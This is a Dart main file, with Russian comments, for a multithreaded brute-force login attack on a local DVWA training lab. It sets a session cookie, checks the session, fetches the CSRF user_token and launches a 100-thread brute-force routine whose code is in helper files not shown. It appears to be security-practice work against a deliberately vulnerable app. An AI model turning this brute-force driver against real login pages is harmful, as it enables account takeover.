import 'fetching_util.dart';
import 'generation_util.dart';

void main() async {
  String baseUrl = "http://localhost:4280/vulnerabilities/brute/";
  String indexUrl = "http://localhost:4280/index.php";
  //замените PHPSESSID на вашу
  String cookie = "security=low; PHPSESSID=051d9569cc477bae29f09a15fc1a6ad3";
  final networkUtil = NetworkUtil(cookies: cookie);

  int threadCount = 100;

  // Загружаем index.php с использованием cookie
  final indexContent = await networkUtil.fetchIndexPage(indexUrl);

  /// проверка входа
  if (indexContent == null || indexContent.contains('login.php')) {
    print("Сессия устарела");
  } else {
    print("Содержимое index.php:\n$indexContent");
  }

  final userToken = await networkUtil.fetchUserToken(baseUrl);
  print(userToken);

  if (userToken == null) {
    print('Не удалось получить user_token. Проверьте URL.');
    return;
  }

  await GenerationUtil(
          baseUrl: baseUrl,
          userToken: userToken,
          threadCount: threadCount,
          networkUtil: networkUtil)
      .bruteForceDVWA();
}
